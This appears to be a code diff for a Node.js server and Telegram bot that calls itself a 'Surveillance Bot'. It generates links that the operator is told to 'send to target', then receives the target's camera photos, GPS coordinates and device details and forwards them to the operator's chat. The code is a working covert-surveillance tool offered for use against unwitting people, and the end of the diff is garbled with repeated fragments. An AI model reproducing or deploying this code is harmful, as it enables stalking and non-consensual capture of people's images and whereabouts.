@@ -7,19 +7,28 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 
-// Telegram Bot Setup - NO POLLING for Render
+// Telegram Bot Setup
 const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
+
+// Auto-detect webhook URL from request
+app.use((req, res, next) => {
+  if (!global.webhookSet && req.get('host')) {
+    const protocol = req.protocol || 'https';
+    const webhookUrl = `${protocol}://${req.get('host')}/bot${process.env.TELEGRAM_BOT_TOKEN}`;
+    
+    bot.setWebHook(webhookUrl)
+      .then(() => {
+        console.log('✅ Webhook auto-set:', webhookUrl);
+        global.webhookSet = true;
+      })
+      .catch(err => console.error('❌ Webhook error:', err.message));
+  }
+  next();
+});
 
 // Store for user sessions
 const userSessions = new Map();
-
-// Set webhook if URL provided
-if (WEBHOOK_URL) {
-  bot.setWebHook(`${WEBHOOK_URL}/bot${process.env.TELEGRAM_BOT_TOKEN}`);
-  console.log('📡 Webhook set:', WEBHOOK_URL);
-}
 
 // Multer setup
 const storage = multer.diskStorage({
@@ -44,66 +53,192 @@ const upload = multer({
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Webhook endpoint for Telegram
+// Webhook endpoint
 app.post(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// Main route
+// Routes
 app.get('/', (req, res) => {
   const indexPath = path.join(__dirname, 'public', 'index.html');
-  
   if (fs.existsSync(indexPath)) {
     res.sendFile(indexPath);
   } else {
-    res.status(404).send('index.html not found. Please create public/index.html');
+    res.status(404).send('❌ index.html not found. Create public/index.html file!');
   }
 });
 
-// Health check
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'ok',
     bot: !!process.env.TELEGRAM_BOT_TOKEN,
-    webhook: !!WEBHOOK_URL,
+    webhook: global.webhookSet || false,
+    host: req.get('host'),
     timestamp: new Date().toISOString()
-  });
-});
-
-// Test endpoint
-app.get('/test', (req, res) => {
-  res.json({
-    message: 'Server is working!',
-    bot_configured: !!process.env.TELEGRAM_BOT_TOKEN,
-    webhook_configured: !!WEBHOOK_URL,
-    sessions_count: userSessions.size
   });
 });
 
 // Upload photo endpoint
 app.post('/upload-photo', upload.single('photo'), async (req, res) => {
-  console.log('📸 Photo upload request received');
+  console.log('📸 Upload request');
   
   try {
     if (!req.file) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'No photo received' 
-      });
+      return res.status(400).json({ success: false, error: 'No photo' });
     }
 
     const { sessionId, cameraType, location, browserInfo } = req.body;
-    
-    // Get session details
     const session = userSessions.get(sessionId);
+    
     if (!session) {
-      console.log('❌ Invalid session:', sessionId);
-      return res.status(404).json({ 
-        success: false, 
-        error: 'Invalid session. Please generate a new link.' 
-      });
+      return res.status(404).json({ success: false, error: 'Invalid session' });
     }
+
+    const chatId = session.chatId;
+    const photoPath = req.file.path;
+    const locationData = location ? JSON.parse(location) : null;
+    const browserData = browserInfo ? JSON.parse(browserInfo) : {};
+
+    let caption = `📸 *Photo Captured*\n\n`;
+    caption += `📷 ${cameraType === 'front' ? 'Front' : 'Back'} Camera\n`;
+    caption += `🆔 Session: \`${sessionId}\`\n`;
+    caption += `📊 #${session.captures + 1}\n\n`;
+
+    if (locationData?.latitude) {
+      caption += `📍 Location:\n`;
+      caption += `\`${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}\`\n\n`;
+    }
+
+    caption += `💻 ${browserData.platform || 'Unknown'}\n`;
+    caption += `📱 ${browserData.screenWidth}x${browserData.screenHeight}\n`;
+    caption += `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;
+
+    await bot.sendPhoto(chatId, fs.createReadStream(photoPath), {
+      caption: caption,
+      parse_mode: 'Markdown'
+    });
+
+    if (locationData?.latitude) {
+      await bot.sendLocation(chatId, locationData.latitude, locationData.longitude);
+    }
+
+    session.captures++;
+    session.lastCapture = new Date();
+    fs.unlinkSync(photoPath);
+
+    res.json({ success: true, captureNumber: session.captures });
+
+  } catch (error) {
+    console.error('❌ Error:', error);
+    if (req.file?.path) fs.unlinkSync(req.file.path);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Bot commands
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  bot.sendMessage(chatId, `
+🔐 *Surveillance Bot*
+
+Commands:
+/generatelink - Generate link
+/sessions - View sessions
+/help - Help
+
+Click below to start! 👇
+`, { 
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [[
+        { text: '🔗 Generate Link', callback_data: 'gen' }
+      ]]
+    }
+  });
+});
+
+bot.onText(/\/generatelink/, (msg) => {
+  generateLink(msg.chat.id);
+});
+
+bot.onText(/\/sessions/, (msg) => {
+  showSessions(msg.chat.id);
+});
+
+bot.on('callback_query', (query) => {
+  if (query.data === 'gen') {
+    generateLink(query.message.chat.id);
+  }
+  bot.answerCallbackQuery(query.id);
+});
+
+function generateLink(chatId) {
+  const sessionId = Math.random().toString(36).substring(7);
+  const baseUrl = process.env.BASE_URL || 'https://your-app.onrender.com';
+  const link = `${baseUrl}/?session=${sessionId}`;
+  
+  userSessions.set(sessionId, {
+    chatId: chatId,
+    createdAt: new Date(),
+    captures: 0
+  });
+
+  bot.sendMessage(chatId, `
+✅ *Link Generated!*
+
+🔗 \`${link}\`
+
+📋 Session: \`${sessionId}\`
+⏰ ${new Date().toLocaleString('en-IN')}
+
+Send this link to target. You'll receive photos here! 📸
+`, { 
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [[
+        { text: '🔗 Open', url: link }
+      ]]
+    }
+  });
+}
+
+function showSessions(chatId) {
+  const sessions = Array.from(userSessions.entries())
+    .filter(([_, s]) => s.chatId === chatId);
+
+  if (sessions.length === 0) {
+    bot.sendMessage(chatId, '📭 No sessions. Use /generatelink');
+    return;
+  }
+
+  let msg = `📊 *Sessions (${sessions.length})*\n\n`;
+  sessions.forEach(([id, s], i) => {
+    msg += `${i+1}. \`${id}\`: ${s.captures} photos\n`;
+  });
+
+  bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
+}
+
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('================================');
+  console.log(`🚀 Port: ${PORT}`);
+  console.log(`📱 Bot: ${process.env.TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
+  console.log(`📂 public/: ${fs.existsSync('public') ? '✅' : '❌'}`);
+  console.log(`📄 index.html: ${fs.existsSync('public/index.html') ? '✅' : '❌'}`);
+  console.log('================================');
+});
+
+// Cleanup
+setInterval(() => {
+  const now = new Date();
+  for (const [id, s] of userSessions.entries()) {
+    if (now - s.createdAt > 24 * 60 * 60 * 1000) {
+      userSessions.delete(id);
+    }
+  }
+}, 60 * 60 * 1000);    }
 
     const chatId = session.chatId;
     const photoPath = req.file.path;
